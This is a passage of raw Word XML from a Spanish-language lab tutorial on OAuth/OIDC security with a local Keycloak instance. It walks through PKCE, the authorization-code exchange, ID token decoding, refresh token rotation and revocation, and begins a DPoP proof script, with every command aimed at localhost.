        </w:rPr>
        <w:t>Proof Key for Code Exchange (PKCE): S256</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (requerido). Guardá.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Para ver rotación de refresh: en </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Settings</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> activá </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Revoke Refresh Token</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (y </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>Refresh Token Max Reuse = 0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Usuario:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>Users</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> → </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>Add user</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> → username </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>tester</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> → </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>Create</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> → pestaña </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Credentials</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> → </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>Set password</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (sin temporal).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Qué configura:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> un IdP OIDC real en tu máquina, con PKCE y rotación de refresh.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Paso 14 — Ejecutar el flujo Authorization Code + PKCE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 Generar verifier y challenge (PKCE)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>VERIFIER=$(python -c "import secrets; print(secrets.token_urlsafe(64))")</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>CHALLENGE=$(python -c "import hashlib,base64,sys; v=sys.argv[1].encode(); print(base64.urlsafe_b64encode(hashlib.sha256(v).digest()).rstrip(b'=').decode())" "$VERIFIER")</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>echo "verifier=$VERIFIER"; echo "challenge=$CHALLENGE"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Abrí en el navegador (reemplazá </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>CHALLENGE</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>):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http://localhost:8080/realms/lab/protocol/openid-connect/auth</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  ?response_type=code</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  &amp;client_id=lab-web</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  &amp;redirect_uri=http://localhost:8989/callback</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  &amp;scope=openid profile email</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  &amp;state=abc123</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  &amp;nonce=n-0S6_WzA2Mj</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  &amp;code_challenge=CHALLENGE</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  &amp;code_challenge_method=S256</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Iniciá sesión con </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>tester</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">. El navegador intentará ir a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>http://localhost:8989/callback?code=XXXX&amp;state=abc123</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (fallará la carga, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>es esperado</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">). </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Copiá el </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>code</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> de la barra de direcciones.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CODE="pegar-el-code"</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>VERIFIER="pegar-el-verifier"</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>curl -s -X POST http://localhost:8080/realms/lab/protocol/openid-connect/token \</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  -d grant_type=authorization_code -d client_id=lab-web \</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  -d code="$CODE" -d redirect_uri=http://localhost:8989/callback \</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  -d code_verifier="$VERIFIER" | tee tokens.json | jq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JSON con </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>access_token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id_token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refresh_token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el código se cambia por tokens por </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>canal trasero</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>, protegido por PKCE.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Paso 15 — Decodificar el ID token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IDT=$(jq -r .id_token tokens.json)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>python - "$IDT" &lt;&lt;'PY'</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>import sys, json, base64</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>p = sys.argv[1].split('.')[1]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>p += '=' * (-len(p) % 4)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>print(json.dumps(json.loads(base64.urlsafe_b64decode(p)), indent=2, ensure_ascii=False))</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>PY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iss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exp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sub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auth_time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amr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nonce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sid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el ID token dice </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>quién</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> y </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>cómo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> se autenticó; va a la app, y </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>no</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> se usa para acceder a recursos.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Paso 16 — Probar que PKCE es obligatorio</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Repetí el intercambio </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>sin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code_verifier</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (con un code nuevo):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curl -s -X POST http://localhost:8080/realms/lab/protocol/openid-connect/token \</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  -d grant_type=authorization_code -d client_id=lab-web \</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  -d code="$CODE" -d redirect_uri=http://localhost:8989/callback | jq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error </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>invalid_grant</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> ("code_verifier missing"). Con Keycloak y PKCE obligatorio, el código robado </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>no sirve sin el verifier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Paso 17 — Refresh token y rotación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RT=$(jq -r .refresh_token tokens.json)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># Canje 1</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>curl -s -X POST http://localhost:8080/realms/lab/protocol/openid-connect/token \</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  -d grant_type=refresh_token -d client_id=lab-web -d refresh_token="$RT" &gt; t2.json</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>RT2=$(jq -r .refresh_token t2.json)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>echo "RT viejo: ${RT:0:20}..."; echo "RT nuevo: ${RT2:0:20}..."</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># Reusar el VIEJO (debe fallar si hay rotación/revoke)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>curl -s -X POST http://localhost:8080/realms/lab/protocol/openid-connect/token \</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  -d grant_type=refresh_token -d client_id=lab-web -d refresh_token="$RT" | jq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el refresh cambia y el viejo devuelve </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>invalid_grant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rotación + detección de reuso (lo que </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>RFC 9700</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> exige para clientes públicos).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Paso 18 — Revocación / logout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 Revocar el refresh</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>curl -s -X POST http://localhost:8080/realms/lab/protocol/openid-connect/revoke \</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  -d client_id=lab-web -d token="$RT2" -d token_type_hint=refresh_token -o /dev/null -w "%{http_code}\n"</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># Verificar que ya no sirve</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>curl -s -X POST http://localhost:8080/realms/lab/protocol/openid-connect/token \</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  -d grant_type=refresh_token -d client_id=lab-web -d refresh_token="$RT2" | jq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revocación </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>200</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">; luego </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>invalid_grant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existe un endpoint de revocación (</w:t>
      </w:r>
      <w:hyperlink r:id="rId9">
        <w:r>
          <w:rPr>
            <w:color w:val="0563C1"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">RFC 7009</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>) y el logout debe invalidar artefactos.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Parte D — DPoP (sender-constrained)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Paso 19 — Construir una prueba DPoP (conceptual, local)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pip install cryptography</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>cat &gt; dpop_proof.py &lt;&lt;'PY'</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># DPoP: el CLIENTE firma una "prueba" con su clave privada. RFC 9449.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>import json, base64, time, secrets</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>from cryptography.hazmat.primitives.asymmetric import ec</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>from cryptography.hazmat.primitives import hashes</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>from cryptography.hazmat.primitives.asymmetric.utils import decode_dss_signature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def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b'=').decode()</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>def b64u_json(o): return b64u(json.dumps(o, separators=(',',':')).encode())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key = ec.generate_private_key(ec.SECP256R1())</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>header = {"typ": "dpop+jwt", "alg": "ES256",</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">          "jwk": {"kty":"EC","crv":"P-256",</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">                  "x": b64u(key.public_key().public_numbers().x.to_bytes(32,'big')),</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">                  "y": b64u(key.public_key().public_numbers().y.to_bytes(32,'big'))}}</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>claims = {"jti": secrets.token_urlsafe(16), "htm": "GET", "htu": "http://localhost:5000/safe",</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">          "iat": int(time.time())}</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>signing_input = (b64u_json(header) + "." + b64u_json(claims)).encode()</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>der = key.sign(signing_input, ec.ECDSA(hashes.SHA256()))</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>r, s = decode_dss_signature(der)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>sig = b64u(r.to_bytes(32,'big') + s.to_bytes(32,'big'))</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
